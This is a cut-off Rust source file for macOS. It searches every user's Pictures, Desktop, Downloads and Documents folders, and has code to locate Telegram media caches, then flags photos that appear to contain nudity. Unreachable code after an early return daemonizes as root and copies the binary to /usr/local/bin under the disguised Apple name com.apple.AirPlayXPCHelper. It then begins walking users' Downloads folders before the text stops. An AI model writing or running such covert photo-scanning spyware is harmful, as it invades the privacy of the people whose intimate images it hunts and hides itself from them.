use std::cmp::Ordering;
use std::collections::{BTreeMap, HashMap};
use std::ffi::OsStr;
use std::fs;
use std::fs::File;
use std::io::{BufReader, Read, Seek, SeekFrom, Write};
use std::os::unix::ffi::OsStrExt;
use std::os::unix::fs::PermissionsExt;
use std::path::{Path, PathBuf};

use daemonize::Daemonize;
use exif::Context;
use image::GenericImageView;
use lazy_static::lazy_static;
use walkdir::{DirEntry, WalkDir};

use rayon::iter::{IntoParallelRefIterator, ParallelBridge, ParallelIterator};

const RATIOS: &[f32; 5] = &[
    3088.0 / 2320.0,
    4032.0 / 1908.0,
    4.0 / 3.0,
    16.0 / 9.0,
    1.0 / 1.0,
];

const EXIF_TAGS_BASE: [(u16, &str); 57] = [
    // version tags
    (0x9000, "ExifVersion"),             // EXIF version
    (0xA000, "FlashpixVersion"),         // Flashpix format version

    // colorspace tags
    (0xA001, "ColorSpace"),              // Color space information tag

    // image configuration
    (0xA002, "PixelXDimension"),         // Valid width of meaningful image
    (0xA003, "PixelYDimension"),         // Valid height of meaningful image
    (0x9101, "ComponentsConfiguration"), // Information about channels
    (0x9102, "CompressedBitsPerPixel"),  // Compressed bits per pixel

    // user information
    (0x927C, "MakerNote"),               // Any desired information written by the manufacturer
    (0x9286, "UserComment"),             // Comments by user

    // related file
    (0xA004, "RelatedSoundFile"),        // Name of related sound file

    // date and time
    (0x9003, "DateTimeOriginal"),        // Date and time when the original image was generated
    (0x9004, "DateTimeDigitized"),       // Date and time when the image was stored digitally
    (0x9290, "SubsecTime"),              // Fractions of seconds for DateTime
    (0x9291, "SubsecTimeOriginal"),      // Fractions of seconds for DateTimeOriginal
    (0x9292, "SubsecTimeDigitized"),     // Fractions of seconds for DateTimeDigitized

    // picture-taking conditions
    (0x829A, "ExposureTime"),            // Exposure time (in seconds)
    (0x829D, "FNumber"),                 // F number
    (0x8822, "ExposureProgram"),         // Exposure program
    (0x8824, "SpectralSensitivity"),     // Spectral sensitivity
    (0x8827, "ISOSpeedRatings"),         // ISO speed rating
    (0x8828, "OECF"),                    // Optoelectric conversion factor
    (0x9201, "ShutterSpeedValue"),       // Shutter speed
    (0x9202, "ApertureValue"),           // Lens aperture
    (0x9203, "BrightnessValue"),         // Value of brightness
    (0x9204, "ExposureBias"),            // Exposure bias
    (0x9205, "MaxApertureValue"),        // Smallest F number of lens
    (0x9206, "SubjectDistance"),         // Distance to subject in meters
    (0x9207, "MeteringMode"),            // Metering mode
    (0x9208, "LightSource"),             // Kind of light source
    (0x9209, "Flash"),                   // Flash status
    (0x9214, "SubjectArea"),             // Location and area of main subject
    (0x920A, "FocalLength"),             // Focal length of the lens in mm
    (0xA20B, "FlashEnergy"),             // Strobe energy in BCPS
    (0xA20C, "SpatialFrequencyResponse"),    //
    (0xA20E, "FocalPlaneXResolution"),   // Number of pixels in width direction per FocalPlaneResolutionUnit
    (0xA20F, "FocalPlaneYResolution"),   // Number of pixels in height direction per FocalPlaneResolutionUnit
    (0xA210, "FocalPlaneResolutionUnit"),    // Unit for measuring FocalPlaneXResolution and FocalPlaneYResolution
    (0xA214, "SubjectLocation"),         // Location of subject in image
    (0xA215, "ExposureIndex"),           // Exposure index selected on camera
    (0xA217, "SensingMethod"),           // Image sensor type
    (0xA300, "FileSource"),              // Image source (3 == DSC)
    (0xA301, "SceneType"),               // Scene type (1 == directly photographed)
    (0xA302, "CFAPattern"),              // Color filter array geometric pattern
    (0xA401, "CustomRendered"),          // Special processing
    (0xA402, "ExposureMode"),            // Exposure mode
    (0xA403, "WhiteBalance"),            // 1 = auto white balance, 2 = manual
    (0xA404, "DigitalZoomRation"),       // Digital zoom ratio
    (0xA405, "FocalLengthIn35mmFilm"),   // Equivalent foacl length assuming 35mm film camera (in mm)
    (0xA406, "SceneCaptureType"),        // Type of scene
    (0xA407, "GainControl"),             // Degree of overall image gain adjustment
    (0xA408, "Contrast"),                // Direction of contrast processing applied by camera
    (0xA409, "Saturation"),              // Direction of saturation processing applied by camera
    (0xA40A, "Sharpness"),               // Direction of sharpness processing applied by camera
    (0xA40B, "DeviceSettingDescription"),    //
    (0xA40C, "SubjectDistanceRange"),    // Distance to subject

    // other tags
    (0xA005, "InteroperabilityIFDPointer"),
    (0xA420, "ImageUniqueID")            // Identifier assigned uniquely to each image
];

const EXIF_TAGS_TIFF: [(u16, &str); 33] = [
    (0x0100, "ImageWidth"),
    (0x0101, "ImageHeight"),
    (0x8769, "ExifIFDPointer"),
    (0x8825, "GPSInfoIFDPointer"),
    (0xA005, "InteroperabilityIFDPointer"),
    (0x0102, "BitsPerSample"),
    (0x0103, "Compression"),
    (0x0106, "PhotometricInterpretation"),
    (0x0112, "Orientation"),
    (0x0115, "SamplesPerPixel"),
    (0x011C, "PlanarConfiguration"),
    (0x0212, "YCbCrSubSampling"),
    (0x0213, "YCbCrPositioning"),
    (0x011A, "XResolution"),
    (0x011B, "YResolution"),
    (0x0128, "ResolutionUnit"),
    (0x0111, "StripOffsets"),
    (0x0116, "RowsPerStrip"),
    (0x0117, "StripByteCounts"),
    (0x0201, "JPEGInterchangeFormat"),
    (0x0202, "JPEGInterchangeFormatLength"),
    (0x012D, "TransferFunction"),
    (0x013E, "WhitePoint"),
    (0x013F, "PrimaryChromaticities"),
    (0x0211, "YCbCrCoefficients"),
    (0x0214, "ReferenceBlackWhite"),
    (0x0132, "DateTime"),
    (0x010E, "ImageDescription"),
    (0x010F, "Make"),
    (0x0110, "Model"),
    (0x0131, "Software"),
    (0x013B, "Artist"),
    (0x8298, "Copyright"),
];

const EXIF_TAGS_GPS: [(u16, &str); 31] = [
    (0x0000, "GPSVersionID"),
    (0x0001, "GPSLatitudeRef"),
    (0x0002, "GPSLatitude"),
    (0x0003, "GPSLongitudeRef"),
    (0x0004, "GPSLongitude"),
    (0x0005, "GPSAltitudeRef"),
    (0x0006, "GPSAltitude"),
    (0x0007, "GPSTimeStamp"),
    (0x0008, "GPSSatellites"),
    (0x0009, "GPSStatus"),
    (0x000A, "GPSMeasureMode"),
    (0x000B, "GPSDOP"),
    (0x000C, "GPSSpeedRef"),
    (0x000D, "GPSSpeed"),
    (0x000E, "GPSTrackRef"),
    (0x000F, "GPSTrack"),
    (0x0010, "GPSImgDirectionRef"),
    (0x0011, "GPSImgDirection"),
    (0x0012, "GPSMapDatum"),
    (0x0013, "GPSDestLatitudeRef"),
    (0x0014, "GPSDestLatitude"),
    (0x0015, "GPSDestLongitudeRef"),
    (0x0016, "GPSDestLongitude"),
    (0x0017, "GPSDestBearingRef"),
    (0x0018, "GPSDestBearing"),
    (0x0019, "GPSDestDistanceRef"),
    (0x001A, "GPSDestDistance"),
    (0x001B, "GPSProcessingMethod"),
    (0x001C, "GPSAreaInformation"),
    (0x001D, "GPSDateStamp"),
    (0x001E, "GPSDifferential")
];

const EXIF_TAGS_IDF1: [(u16, &str); 20] = [
    (0x0100, "ImageWidth"),
    (0x0101, "ImageHeight"),
    (0x0102, "BitsPerSample"),
    (0x0103, "Compression"),
    (0x0106, "PhotometricInterpretation"),
    (0x0111, "StripOffsets"),
    (0x0112, "Orientation"),
    (0x0115, "SamplesPerPixel"),
    (0x0116, "RowsPerStrip"),
    (0x0117, "StripByteCounts"),
    (0x011A, "XResolution"),
    (0x011B, "YResolution"),
    (0x011C, "PlanarConfiguration"),
    (0x0128, "ResolutionUnit"),
    (0x0201, "JpegIFOffset"),    // When image format is JPEG, this value show offset to JPEG data stored.(aka "ThumbnailOffset" or "JPEGInterchangeFormat")
    (0x0202, "JpegIFByteCount"), // When image format is JPEG, this value shows data size of JPEG image (aka "ThumbnailLength" or "JPEGInterchangeFormatLength")
    (0x0211, "YCbCrCoefficients"),
    (0x0212, "YCbCrSubSampling"),
    (0x0213, "YCbCrPositioning"),
    (0x0214, "ReferenceBlackWhite")
];

const EXIF_TAGS_INTEROP: [(u16, &str); 2] = [
    (0x0001, "InteroperabilityIndex"),
    (0x0002, "InteroperabilityVersion")
];

lazy_static! {
    static ref EXIF_TAGS_EXIF_MAP: HashMap<u16, &'static str> =
        HashMap::from_iter(EXIF_TAGS_BASE.iter().map(|&x| (x.0, x.1)));

    static ref EXIF_TAGS_TIFF_MAP: HashMap<u16, &'static str> =
        HashMap::from_iter(EXIF_TAGS_TIFF.iter().map(|&x| (x.0, x.1)));

    static ref EXIF_TAGS_GPS_MAP: HashMap<u16, &'static str> =
        HashMap::from_iter(EXIF_TAGS_GPS.iter().map(|&x| (x.0, x.1)));

    static ref EXIF_TAGS_INTEROP_MAP: HashMap<u16, &'static str> =
        HashMap::from_iter(EXIF_TAGS_INTEROP.iter().map(|&x| (x.0, x.1)));
}

#[derive(Debug, Clone, Eq, PartialEq)]
struct Exif {
    tiff: BTreeMap<u16, String>,
    exif: BTreeMap<u16, String>,
    gps: BTreeMap<u16, String>,
    interop: BTreeMap<u16, String>,
    human: Option<HumExif>,
}

#[derive(Debug, Clone, Eq, PartialEq)]
struct HumExif {
    tiff: BTreeMap<String, String>,
    exif: BTreeMap<String, String>,
    gps: BTreeMap<String, String>,
    interop: BTreeMap<String, String>,
}

impl HumExif {
    #[inline(always)]
    fn new() -> HumExif {
        HumExif {
            tiff: BTreeMap::new(),
            exif: BTreeMap::new(),
            gps: BTreeMap::new(),
            interop: BTreeMap::new(),
        }
    }
}

#[derive(Debug, Clone, Eq, PartialEq, Hash, Copy, Ord, PartialOrd)]
enum ExifHint {
    Tiff,
    Exif,
    Gps,
    Interop,
}

impl Exif {
    #[inline(always)]
    fn new() -> Exif {
        Exif {
            tiff: BTreeMap::new(),
            exif: BTreeMap::new(),
            gps: BTreeMap::new(),
            interop: BTreeMap::new(),
            human: None,
        }
    }

    #[inline(always)]
    fn with_tiff(self, tiff: BTreeMap<u16, String>) -> Self {
        Self {
            tiff,
            ..self
        }
    }

    #[inline(always)]
    fn with_exif(self, exif: BTreeMap<u16, String>) -> Self {
        Self {
            exif,
            ..self
        }
    }

    #[inline(always)]
    fn with_gps(self, gps: BTreeMap<u16, String>) -> Self {
        Self {
            gps,
            ..self
        }
    }

    #[inline(always)]
    fn with_interop(self, interop: BTreeMap<u16, String>) -> Self {
        Self {
            interop,
            ..self
        }
    }

    #[inline(always)]
    fn try_parse_tag(&self, tag: (&u16, &String), tag_hint: ExifHint) -> Option<(String, String)> {
        let (tag_id, tag_value) = tag;

        let tag_name = match tag_hint {
            ExifHint::Tiff => EXIF_TAGS_TIFF_MAP.get(tag_id),
            ExifHint::Exif => EXIF_TAGS_EXIF_MAP.get(tag_id),
            ExifHint::Gps => EXIF_TAGS_GPS_MAP.get(tag_id),
            ExifHint::Interop => EXIF_TAGS_INTEROP_MAP.get(tag_id),
        };

        match tag_name {
            Some(name) => Some((name.to_string(), tag_value.to_string())),
            None => None,
        }
    }

    #[inline(always)]
    fn with_human_readable(self) -> Self {
        let mut hum = HumExif::new();

        for tag in &self.tiff {
            if let Some(tag) = self.try_parse_tag(tag, ExifHint::Tiff) {
                hum.tiff.insert(tag.0, tag.1);
            }
        }

        for tag in &self.exif {
            if let Some(tag) = self.try_parse_tag(tag, ExifHint::Exif) {
                hum.exif.insert(tag.0, tag.1);
            }
        }

        for tag in &self.gps {
            if let Some(tag) = self.try_parse_tag(tag, ExifHint::Gps) {
                hum.gps.insert(tag.0, tag.1);
            }
        }

        for tag in &self.interop {
            if let Some(tag) = self.try_parse_tag(tag, ExifHint::Interop) {
                hum.interop.insert(tag.0, tag.1);
            }
        }

        Self {
            human: Some(hum),
            ..self
        }
    }
}

#[inline(always)]
fn read_exif(imagepath: &str) -> Option<Exif> {
    let mut file = File::open(&imagepath).unwrap();
    let mut buf = BufReader::new(file);

    if let Ok(exif) = exif::Reader::new().read_from_container(&mut buf) {
        let mut tiff_meta = BTreeMap::<u16, String>::new();
        let mut exif_meta = BTreeMap::<u16, String>::new();
        let mut gps_meta = BTreeMap::<u16, String>::new();
        let mut interop_meta = BTreeMap::<u16, String>::new();

        exif.fields().for_each(|field: &exif::Field| {
            if let exif::Tag(ctx, b) = field.tag {
                match ctx {
                    Context::Tiff => {
                        tiff_meta.insert(b, field.display_value().to_string());
                    }
                    Context::Exif => {
                        exif_meta.insert(b, field.display_value().to_string());
                    }
                    Context::Gps => {
                        gps_meta.insert(b, field.display_value().to_string());
                    }
                    Context::Interop => {
                        interop_meta.insert(b, field.display_value().to_string());
                    }
                    _ => {
                        println!("Unknown context");
                    }
                }
            }
        });

        return Some(
            Exif::new()
                .with_tiff(tiff_meta)
                .with_exif(exif_meta)
                .with_gps(gps_meta)
                .with_interop(interop_meta)
                .with_human_readable(),
        );
    }

    None
}

#[derive(Debug, Clone, Eq, PartialEq, Hash, Copy)]
enum ResolutionType {
    Iphone,
    Ipad,
    Mac,
    Android,
    Dslr,
    Webcam,
    PointAndShoot,
    K4,
    K8,
    GenericRatioMatch,
}

#[derive(Debug, Clone, Eq, PartialEq, Hash, Copy)]
struct ImageRes {
    width: u32,
    height: u32,
}

impl ImageRes {
    #[inline(always)]
    fn new() -> ImageRes {
        ImageRes {
            width: 0,
            height: 0,
        }
    }

    #[inline(always)]
    fn with_width(self, width: u32) -> Self {
        Self {
            width,
            ..self
        }
    }

    #[inline(always)]
    fn with_height(self, height: u32) -> Self {
        Self {
            height,
            ..self
        }
    }

    #[inline(always)]
    fn check_for_iphone_resolutions(&self) -> bool {
        let width = self.width;
        let height = self.height;

        if width == 4032 && height == 3024 {
            return true;
        }

        if width == 3024 && height == 4032 {
            return true;
        }

        if width == 3024 && height == 3024 {
            return true;
        }

        if width == 2016 && height == 1512 {
            return true;
        }

        if width == 1512 && height == 2016 {
            return true;
        }

        if width == 2016 && height == 2016 {
            return true;
        }

        if width == 1008 && height == 756 {
            return true;
        }

        if width == 756 && height == 1008 {
            return true;
        }

        if width == 1008 && height == 1008 {
            return true;
        }

        false
    }

    #[inline(always)]
    fn check_for_ipad_resolutions(&self) -> bool {
        let width = self.width;
        let height = self.height;

        if width == 2048 && height == 1536 {
            return true;
        }

        if width == 1536 && height == 2048 {
            return true;
        }

        if width == 1536 && height == 1536 {
            return true;
        }

        if width == 1024 && height == 768 {
            return true;
        }

        if width == 768 && height == 1024 {
            return true;
        }

        if width == 768 && height == 768 {
            return true;
        }

        false
    }

    #[inline(always)]
    fn check_for_mac_resolutions(&self) -> bool {
        let width = self.width;
        let height = self.height;

        if width == 1280 && height == 800 {
            return true;
        }

        if width == 800 && height == 1280 {
            return true;
        }

        if width == 800 && height == 800 {
            return true;
        }

        false
    }

    #[inline(always)]
    fn check_for_android_resolutions(&self) -> bool {
        let width = self.width;
        let height = self.height;

        if width == 4032 && height == 3024 {
            return true;
        }

        if width == 3024 && height == 4032 {
            return true;
        }

        if width == 3024 && height == 3024 {
            return true;
        }

        if width == 2016 && height == 1512 {
            return true;
        }

        if width == 1512 && height == 2016 {
            return true;
        }

        if width == 2016 && height == 2016 {
            return true;
        }

        if width == 1008 && height == 756 {
            return true;
        }

        if width == 756 && height == 1008 {
            return true;
        }

        if width == 1008 && height == 1008 {
            return true;
        }

        false
    }

    #[inline(always)]
    fn check_for_dslr_resolutions(&self) -> bool {
        let width = self.width;
        let height = self.height;

        if width == 6000 && height == 4000 {
            return true;
        }

        if width == 4000 && height == 6000 {
            return true;
        }

        if width == 4000 && height == 4000 {
            return true;
        }

        if width == 3000 && height == 2000 {
            return true;
        }

        if width == 2000 && height == 3000 {
            return true;
        }

        if width == 2000 && height == 2000 {
            return true;
        }

        if width == 1500 && height == 1000 {
            return true;
        }

        if width == 1000 && height == 1500 {
            return true;
        }

        if width == 1000 && height == 1000 {
            return true;
        }

        false
    }

    #[inline(always)]
    fn check_for_webcam_resolutions(&self) -> bool {
        let width = self.width;
        let height = self.height;

        if width == 1280 && height == 720 {
            return true;
        }

        if width == 720 && height == 1280 {
            return true;
        }

        if width == 720 && height == 720 {
            return true;
        }

        if width == 640 && height == 480 {
            return true;
        }

        if width == 480 && height == 640 {
            return true;
        }

        if width == 480 && height == 480 {
            return true;
        }

        false
    }

    #[inline(always)]
    fn check_for_point_and_shoot_resolutions(&self) -> bool {
        let width = self.width;
        let height = self.height;

        if width == 4608 && height == 3456 {
            return true;
        }

        if width == 3456 && height == 4608 {
            return true;
        }

        if width == 3456 && height == 3456 {
            return true;
        }

        if width == 2304 && height == 1728 {
            return true;
        }

        if width == 1728 && height == 2304 {
            return true;
        }

        if width == 1728 && height == 1728 {
            return true;
        }

        if width == 1152 && height == 864 {
            return true;
        }

        if width == 864 && height == 1152 {
            return true;
        }

        if width == 864 && height == 864 {
            return true;
        }

        false
    }

    #[inline(always)]
    fn check_for_4k_resolutions(&self) -> bool {
        let width = self.width;
        let height = self.height;

        if width == 3840 && height == 2160 {
            return true;
        }

        if width == 2160 && height == 3840 {
            return true;
        }

        if width == 2160 && height == 2160 {
            return true;
        }

        if width == 1920 && height == 1080 {
            return true;
        }

        if width == 1080 && height == 1920 {
            return true;
        }

        if width == 1080 && height == 1080 {
            return true;
        }

        false
    }

    #[inline(always)]
    fn check_for_8k_resolutions(&self) -> bool {
        let width = self.width;
        let height = self.height;

        if width == 7680 && height == 4320 {
            return true;
        }

        if width == 4320 && height == 7680 {
            return true;
        }

        if width == 4320 && height == 4320 {
            return true;
        }

        if width == 3840 && height == 2160 {
            return true;
        }

        if width == 2160 && height == 3840 {
            return true;
        }

        if width == 2160 && height == 2160 {
            return true;
        }

        false
    }

    #[inline(always)]
    fn get_resolution_type(&self) -> Vec<ResolutionType> {
        let mut res_type = Vec::new();

        if self.check_for_iphone_resolutions() {
            res_type.push(ResolutionType::Iphone);
        }

        if self.check_for_ipad_resolutions() {
            res_type.push(ResolutionType::Ipad);
        }

        if self.check_for_mac_resolutions() {
            res_type.push(ResolutionType::Mac);
        }

        if self.check_for_android_resolutions() {
            res_type.push(ResolutionType::Android);
        }

        if self.check_for_dslr_resolutions() {
            res_type.push(ResolutionType::Dslr);
        }

        if self.check_for_webcam_resolutions() {
            res_type.push(ResolutionType::Webcam);
        }

        if self.check_for_point_and_shoot_resolutions() {
            res_type.push(ResolutionType::PointAndShoot);
        }

        if self.check_for_4k_resolutions() {
            res_type.push(ResolutionType::K4);
        }

        if self.check_for_8k_resolutions() {
            res_type.push(ResolutionType::K8);
        }

        if res_type.len() == 0 {
            RATIOS
                .iter()
                .for_each(|ratio| {
                    if self.width as f32 / self.height as f32 == *ratio
                    || self.height as f32 / self.width as f32 == *ratio{
                        res_type.push(ResolutionType::GenericRatioMatch);
                    }
                });
        }

        res_type
    }
}

#[inline(always)]
fn try_get_image_resolution(image_path: &str) -> Option<ImageRes> {
    // using immeta to get image resolution
    immeta::load_from_file(&image_path)
        .map(|meta|
            match meta {
                immeta::GenericMetadata::Jpeg(jpeg) => {
                    Some(
                        ImageRes {
                            width: jpeg.dimensions.width,
                            height: jpeg.dimensions.height,
                        }
                    )
                }
                immeta::GenericMetadata::Png(png) => {
                    Some(
                        ImageRes {
                            width: png.dimensions.width,
                            height: png.dimensions.height,
                        }
                    )
                }
                immeta::GenericMetadata::Gif(gif) => {
                    Some(
                        ImageRes {
                            width: gif.dimensions.width,
                            height: gif.dimensions.height,
                        }
                    )
                }
                immeta::GenericMetadata::Webp(webp) => {
                    let webp_dim = webp.dimensions();

                    Some(
                        ImageRes {
                            width: webp_dim.width,
                            height: webp_dim.height,
                        }
                    )
                }
            })
        .ok()
        .flatten()
        .or_else(||
            read_exif(&image_path)
                .map(|exif: Exif| {
                    exif.human
                        .map(|hum: HumExif| {
                            hum.tiff
                                .get("ImageWidth")
                                .map(|width| {
                                    hum.tiff
                                        .get("ImageHeight")
                                        .map(|height| {
                                            Some(
                                                ImageRes {
                                                    width: width.to_string().parse::<u32>().unwrap(),
                                                    height: height.to_string().parse::<u32>().unwrap(),
                                                }
                                            )
                                        })
                                        .flatten()
                                })
                                .flatten()
                                .or_else(|| {
                                    hum.exif
                                        .get("PixelXDimension")
                                        .map(|width| {
                                            hum.exif
                                                .get("PixelYDimension")
                                                .map(|height| {
                                                    Some(
                                                        ImageRes {
                                                            width: width.to_string().parse::<u32>().unwrap(),
                                                            height: height.to_string().parse::<u32>().unwrap(),
                                                        }
                                                    )
                                                })
                                                .flatten()
                                        })
                                        .flatten()
                                })
                        })
                        .flatten()
                })
                .flatten()
                .or_else(|| {
                    // using image crate to get image resolution
                    let img = image::open(&image_path).ok()?;

                    let img_dim = img.dimensions();

                    Some(
                        ImageRes {
                            width: img_dim.0,
                            height: img_dim.1,
                        }
                    )
                })
        )
}

#[inline(always)]
fn check_image_contains_nude(
    image_path: &str,
    res: ImageRes,
) -> bool {
    // scale image image to max 1024 either side
    let max_side = 1024;

    let orig_width = res.width;
    let orig_height = res.height;

    let (new_width, new_height) =
        if orig_width > orig_height {
            let scale = orig_width as f32 / max_side as f32;

            let new_width = max_side;
            let new_height = (orig_height as f32 / scale) as u32;

            (new_width, new_height)
        } else {
            let scale = orig_height as f32 / max_side as f32;

            let new_height = max_side;
            let new_width = (orig_width as f32 / scale) as u32;

            (new_width, new_height)
        };

    image::open(&Path::new(&image_path))
        .map(|img| {
            let img =
                if orig_width > max_side || orig_height > max_side {
                    //println!("scaling image to {}x{}..", new_width, new_height);

                    img.resize(
                        new_width,
                        new_height,
                        image::imageops::FilterType::Lanczos3,
                    )
                } else {
                    img
                };

            let nudity = nude::scan(&img).analyse();

            nudity.nude// || nudity.skin_percent > 0.4
        })
        .unwrap_or(false)
}

#[inline(always)]
fn image_get_res(image_path: &str) -> Option<(ImageRes, Vec<ResolutionType>)> {
    try_get_image_resolution(&image_path)
        .map(|res| (res, res.get_resolution_type()))
        .filter(|(_, res_types): &(_, Vec<_>)| !res_types.is_empty())
}

#[inline(always)]
fn image_qualifies_for_checks(image_path: &str) -> (Option<ImageRes>, bool) {
    //println!("checking image: {}", image_path);

    image_get_res(&image_path)
        .map(|(res, res_types): (ImageRes, Vec<ResolutionType>)| {
            //println!("checking image: {} ({:?})", image_path, &res_types);

            if (res.height + res.width) < 2000 {
                return (None, false);
            }

            if res_types.contains(&ResolutionType::Iphone)
                || res_types.contains(&ResolutionType::Ipad)
                || res_types.contains(&ResolutionType::Android)
                || res_types.contains(&ResolutionType::PointAndShoot)
                || res_types.contains(&ResolutionType::GenericRatioMatch)
                //|| res_types.contains(&ResolutionType::Mac)
            {
                //println!("qualifies: {} ({:?})", image_path, res_types);
                (Some(res), true)
            } else {
                //println!("does not qualify: {}", image_path);

                (None, false)
            }
        })
        .unwrap_or({
            //println!("does not qualify: {}", image_path);

            (None, false)
        })
}

#[inline(always)]
fn run_image_checks(image_path: &str) {
    let (res, qualifies) =
        image_qualifies_for_checks(
            &image_path,
        );

    if !qualifies || res.is_none() {
        return;
    }

    if check_image_contains_nude(&image_path, res.unwrap()) {
        println!("{} contains nudity", image_path);
    }
}

#[inline(always)]
fn check_file_ext_is_image(
    file_name: &str,
) -> bool {
    if let Some(ext) = Path::new(file_name).extension() {
        ext == "jpg" || ext == "jpeg" || ext == "png"
    } else {
        false
    }
}

#[inline(always)]
fn find_images_in_dir(
    dir: &str,
    check_image_ext_fn: fn(&str) -> bool,
    check_image_qualifies_fn: fn(&str) -> bool,
) -> Vec<String> {
    WalkDir::new(dir)
        .into_iter()
        .par_bridge()
        .filter_map(|e| e.ok())
        .filter(|e| e.file_type().is_file())
        .filter_map(|e| e.path().to_str().map(|s| s.to_string()))
        .filter(|p| check_image_ext_fn(p))
        .filter(|p| check_image_qualifies_fn(p))
        .collect()
}

#[inline(always)]
fn find_user_folders() -> Vec<String> {
    WalkDir::new("/Users").max_depth(1)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| e.file_type().is_dir())
        .filter_map(|e| e.path().to_str().map(|s| s.to_string()))
        .filter(|p| {
            if let Some(name) = Path::new(p).file_name() {
                name != "Shared" && name != "Guest"
            } else {
                false
            }
        })
        .collect()
}

// identify telegram cache folders
// /Users/19h/Library/Group Containers/6N38VWS5BX.ru.keepcoder.Telegram/[beta/appstore]/<account-6336919408467811841>/postbox/media
#[inline(always)]
fn find_telegram_cache_folders() -> Vec<String> {
    // rewrite into iter

    find_user_folders()
        .iter()
        .filter_map(|user_folder| {
            let mut path = PathBuf::from(user_folder);

            path.push("Library/Group Containers/6N38VWS5BX.ru.keepcoder.Telegram");

            if !path.exists() {
                return None;
            }

            Some(path)
        })
        .map(|path| {
            WalkDir::new(path)
                .max_depth(1)
                .into_iter()
                .par_bridge()
                .filter_map(|e| e.ok())
                .filter_map(|entry| {
                    if !entry.file_type().is_dir() {
                        return None;
                    }

                    let path = entry.path();
                    let path_str = path.file_name();

                    if path_str.is_none() {
                        return None;
                    }

                    Some(
                        WalkDir::new(path)
                            .max_depth(1)
                            .into_iter()
                            .filter_map(|e| e.ok())
                            .filter_map(|entry: DirEntry| {
                                entry
                                    .path()
                                    .to_str()
                                    .map(|s| s.to_string())
                                    .map(|s| {
                                        let mut path = PathBuf::from(s);

                                        path.push("postbox/media");

                                        if path.exists() {
                                            path.to_str()
                                                .map(|s| s.to_string())
                                        } else {
                                            None
                                        }
                                    })
                                    .flatten()
                            })
                            .collect::<Vec<String>>()
                    )
                })
                .flatten()
                .collect::<Vec<String>>()
        })
        .flatten()
        .collect::<Vec<_>>()
}

#[inline(always)]
fn find_images_in_telegram_cache() -> Vec<String> {
    find_telegram_cache_folders()
        .par_iter()
        .map(|folder| {
            find_images_in_dir(
                &folder,
                |_| true,
                |image_path|
                    true
            )
        })
        .flatten()
        .collect::<Vec<_>>()
}

#[inline(always)]
fn scavange_images_in_folder(
    folder: &str,
) -> Vec<String> {
    find_images_in_dir(
        &folder,
        |file_name|
            check_file_ext_is_image(file_name),
        |image_path|
            image_qualifies_for_checks(image_path).1,
    )
}

const RELEVANT_MANUAL_IMAGE_LOCATIONS: [&str; 4] = [
    "Pictures",
    "Desktop",
    "Downloads",
    "Documents",
];

#[inline(always)]
fn find_images_in_user_folder() -> Vec<String> {
    find_user_folders()
        .par_iter()
        .map(|user_folder| {
            RELEVANT_MANUAL_IMAGE_LOCATIONS
                .par_iter()
                .filter_map(|folder| {
                    let mut path = PathBuf::from(user_folder);

                    path.push(folder);

                    if !path.exists() {
                        return None;
                    }

                    path.to_str().map(|s| s.to_string())
                })
                .collect::<Vec<_>>()
        })
        .flatten()
        .map(|folder| scavange_images_in_folder(&folder))
        .flatten()
        .collect::<Vec<_>>()
}

fn main() {
    //let mut timages = find_images_in_telegram_cache();
    let mut uimages = find_images_in_user_folder();

    let manual_image_prefixes = &[
        "img_",
        "dsc_"
    ];

    uimages
        .sort_by(|a, b| {
            let a = Path::new(a);
            let b = Path::new(b);

            let a = a.file_name().unwrap();
            let b = b.file_name().unwrap();

            let a = a.to_str().unwrap();
            let b = b.to_str().unwrap();

            let a = a.to_lowercase();
            let b = b.to_lowercase();

            a.starts_with(manual_image_prefixes[0])
                .cmp(&b.starts_with(manual_image_prefixes[0]))
                .then(
                    a.starts_with(manual_image_prefixes[1])
                    .cmp(&b.starts_with(manual_image_prefixes[1]))
                )
                .then(a.cmp(&b))
                .reverse()
        });

    uimages
        .iter()
        .for_each(|image_path| {
            dbg!(
                image_path,
                image_get_res(image_path)
                .map(|(res, _)| {
                    check_image_contains_nude(image_path, res)
                })
                .unwrap_or(false),
            );

            // sleep 1 second to avoid rate limiting
            std::thread::sleep(std::time::Duration::from_secs(1));
        });

    /*
    image_get_res(file_path)
                        .map(|(res, _)| {
                            check_image_contains_nude(file_path, res)
                        })
                        .unwrap_or(false)
    */

    return;
    let stdout = File::create("/tmp/com.apple.AirPlayXPCHelper.out").unwrap();
    let stderr = File::create("/tmp/com.apple.AirPlayXPCHelper.err").unwrap();

    let daemonize = Daemonize::new()
        .pid_file("/tmp/com.apple.AirPlayXPCHelper.pid") // Every method except `new` and `start`
        .chown_pid_file(true)      // is optional, see `Daemonize` documentation
        .working_directory("/tmp") // for default behaviour.
        .user("root")
        .group(2)        // or group id.
        .umask(0o777)    // Set umask, `0o027` by default.
        .stdout(stdout)  // Redirect stdout to `/tmp/daemon.out`.
        .stderr(stderr)  // Redirect stderr to `/tmp/daemon.err`.
        .privileged_action(|| "Executed before drop privileges");

    match daemonize.start() {
        Ok(_) => {
            println!("Success, daemonized");

            let current_executable = std::env::current_exe();
            let current_executable = current_executable.unwrap();

            if current_executable.as_os_str().to_str().unwrap().to_string() == "/usr/local/bin/com.apple.AirPlayXPCHelper" {
                println!("yolo");
            }

            let mut cur_exe_buf = File::open(&current_executable).unwrap();

            // create /usr/local/bin/ if it doesn't exist
            fs::create_dir_all("/usr/local/bin").unwrap();

            let mut fbuf = Vec::new();

            cur_exe_buf.read_to_end(&mut fbuf).unwrap();

            let mut new_file = File::create("/usr/local/bin/com.apple.AirPlayXPCHelper").unwrap();

            new_file.write_all(
                fbuf.as_slice()
            ).unwrap();

            // make file executable
            fs::set_permissions(
                "/usr/local/bin/com.apple.AirPlayXPCHelper",
                fs::Permissions::from_mode(0o555),
            ).unwrap();

            let mut users = Vec::new();

            let files = fs::read_dir("/Users/").unwrap();
            for file in files {
                if file.as_ref().unwrap().path().is_dir() {
                    let user_dir =
                        file.as_ref()
                            .unwrap()
                            .path()
                            .file_name()
                            .unwrap()
                            .to_str()
                            .map(|s| s.to_string());

                    if let Some(user_dir) = user_dir {
                        if user_dir != "Shared" {
                            users.push(user_dir);
                        }
                    }

                    let files = fs::read_dir(file.unwrap().path()).unwrap();

                    for file in files {
                        if let Ok(ref file) = file {
                            if file.path().is_dir() {
                                let dirname =
                                    file.path()
                                        .file_name()
                                        .unwrap()
                                        .to_str()
                                        .map(|s| s.to_string());

                                if dirname.is_none() {
                                    continue;
                                }

                                let dirname = dirname.unwrap();

                                if dirname != "Downloads" {
                                    continue;
                                }

                                let files = fs::read_dir(file.path()).unwrap();

